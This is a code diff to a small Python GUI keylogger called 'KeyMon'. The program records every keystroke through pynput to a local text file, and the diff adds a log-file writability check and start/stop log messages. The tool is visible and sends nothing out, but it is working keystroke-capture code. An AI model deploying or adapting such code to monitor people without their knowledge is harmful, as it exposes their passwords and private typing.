@@ -1,8 +1,8 @@
 import tkinter as tk
 from tkinter import messagebox
 from pynput import keyboard
-import threading
 import logging
+import os
 
 # Set up logging to a file
 log_file = "key_log.txt"
@@ -24,19 +24,33 @@ class KeyMonApp:
         
         self.listener = None
         self.running = False
-    
+
+        # Check if log file can be written
+        self.check_log_file()
+
+    def check_log_file(self):
+        try:
+            with open(log_file, 'a') as f:
+                f.write("Log file initialized.\n")
+            logging.info("Log file check passed.")
+        except Exception as e:
+            logging.error(f"Failed to write to log file: {e}")
+            messagebox.showerror("KeyMon", f"Cannot write to log file: {e}")
+            self.root.quit()
+
     def on_press(self, key):
         try:
             logging.info(f"Key pressed: {key.char}")
         except AttributeError:
             logging.info(f"Special key pressed: {key}")
-    
+
     def start_keylogger(self):
         if not self.running:
             self.running = True
             self.status_label.config(text="Status: Running", fg="green")
             self.listener = keyboard.Listener(on_press=self.on_press)
             self.listener.start()
+            logging.info("Keylogger started.")
             messagebox.showinfo("KeyMon", "Keylogger started successfully!")
         else:
             messagebox.showwarning("KeyMon", "Keylogger is already running.")
@@ -46,6 +60,7 @@ class KeyMonApp:
             self.listener.stop()
             self.running = False
             self.status_label.config(text="Status: Stopped", fg="red")
+            logging.info("Keylogger stopped.")
             messagebox.showinfo("KeyMon", "Keylogger stopped successfully!")
         else:
             messagebox.showwarning("KeyMon", "Keylogger is not running.")
